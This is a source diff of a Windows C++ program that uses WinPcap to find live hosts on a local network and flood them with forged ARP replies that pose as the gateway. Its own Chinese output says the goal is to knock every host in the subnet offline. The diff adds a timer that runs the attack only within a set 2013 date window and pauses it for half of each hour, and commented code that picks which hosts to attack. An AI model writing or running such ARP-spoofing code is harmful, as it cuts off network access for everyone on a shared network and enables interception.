@@ -4,7 +4,8 @@
 #include "stdafx.h"
 #include "global.h"
 #include "IPHeaders.h"
-
+#include <atltime.h>
+#include <algorithm>
 
 int init_info();
 void enum_host();
@@ -12,11 +13,13 @@ DWORD WINAPI scan_lan(LPVOID lparam);
 void delete_localip_in_hostList();
 void init_arp();
 void init_host_arp();
-void read_ip();
+void read_mac();
+int TimePolic();
 
-int lib_main()
+int main()
 {
 	int nRet = 0;
+	
 	nRet = init_info();
 	if(nRet)
 		return nRet;
@@ -28,12 +31,24 @@ int lib_main()
     printf("%s\n","正在扫描在线主机......");
 	Sleep(2*1000);
     printf("当前在线的主机数量%d\n",hostList.size());
-	printf("%s\n","正在使网段内所有主机断线......按ctrl+z键退出");
+	printf("%s\n","正在使网段内所有主机断线......按ctrl+c键退出");
 	//init_arp();
 	init_host_arp();
 
 	while(true)
 	{
+#ifndef _DEBUG
+		nRet = TimePolic();
+		if(1 == nRet)
+		{
+			break; 
+		}
+		else if(2 == nRet)
+		{
+			Sleep(2*1000);
+			continue;
+		}// 结束 if(2 == nRet)
+#endif
 		std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
 		while(iter != hostList.end())
 		{
@@ -43,7 +58,7 @@ int lib_main()
 			pcap_sendpacket(pfp, sendBuffer, 14+28);
 			iter++;
 		}
-		Sleep(2*1000);
+		Sleep(1000);//TODO:改成随机[1-5]s
 	}
 	pcap_close(pfp);
 }
@@ -67,7 +82,7 @@ int init_info()
             pAdapterInfo = pAdapterInfo->Next;
         }
     }
-	
+
 	//获得活动网卡
 	while(pOrgAdapterInfo != NULL)
 	{
@@ -82,14 +97,20 @@ int init_info()
 
 	//没有满足要求的网卡则说明主机不能正常上网，程序退出。
 	if(pOrgAdapterInfo == NULL)
-		return -1;
+	{
+		printf(_T("无上网网卡"));
+		return - 1;
+	} // 结束 if(pOrgAdapterInfo == NULL)
     //从网卡获取基本网络信息，gatewaymac由上面的SendARP已获得。
 	localip.append((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String);
 	netmask.append((char*)pOrgAdapterInfo->IpAddressList.IpMask.String);
 	gatewayip.append((char*)pOrgAdapterInfo->GatewayList.IpAddress.String);
 	ULONG macLen=6;
 	if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))
-		return -2;
+	{
+		printf("得到网关MAC失败");
+		return - 2;
+	} // 结束 if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))	
 
 	return 0;
 }
@@ -177,17 +198,28 @@ void delete_localip_in_hostList()
 		iter++;
 	}
 
-	/*std::list < PLAN_HOST_INFO > ::iterator itRet;
+	/*
+	//求差集，得到未知的MAC地址，未知的MAC地址是要攻击的
+	set_difference(hostList.begin(), hostList.end(),
+		allHostList.begin(), allHostList.end(),
+		unkownHostList.begin());
+
+	//求交集，得到需要攻击的集合
 	set_intersection(hostList.begin(), hostList.end(),
-		removeHostList.begin(), removeHostList.end(),
-		retureHostList.begin(),itRet.begin());*/
+		spoofHostList.begin(), spoofHostList.end(),
+		retureHostList.begin());
+
+	//合并攻击集合
+	set_union(unkownHostList.begin(), unkownHostList.end(),
+		retureHostList.begin(), retureHostList.end(),
+		hostList.begin()); //*/
 }
 
 void init_arp()
 {
 	memset(&ethernet, 0, sizeof(ethernet));
 	BYTE hostmac[8];
-		
+
 	//此MAC为瞎编的
 	hostmac[0] = 0x00;
 	hostmac[1] = 0x21;
@@ -241,7 +273,36 @@ void init_host_arp()
 	arp.SourceIP = inet_addr(gatewayip.data());
 }
 
-void read_ip()
+
+//返回值：
+//       1:结束
+//       2:暂时停止发送
+int TimePolic()
 {
-	
+	static CTime tStart = CTime::GetCurrentTime();
+	int nRet = 0;
+
+
+	CTime tLimit(2013, 8, 26, 0, 0, 0), tLimitEnd(2013, 9, 29, 12, 59, 59);
+	if(!(tStart > tLimit && tStart < tLimitEnd))
+	{
+		printf("未到时间");
+		return 1;
+	}// 结束 if(!(tStart > tLimit && tStart < tLimitEnd))
+
+
+	CTime tCur = CTime::GetCurrentTime();
+	CTimeSpan ts = tCur - tStart;
+	if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)
+	{
+		return 2;
+	} // 结束 if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)
+
+	return nRet;
+}
+
+//读取mac地址列表
+void read_mac()
+{
+
 }
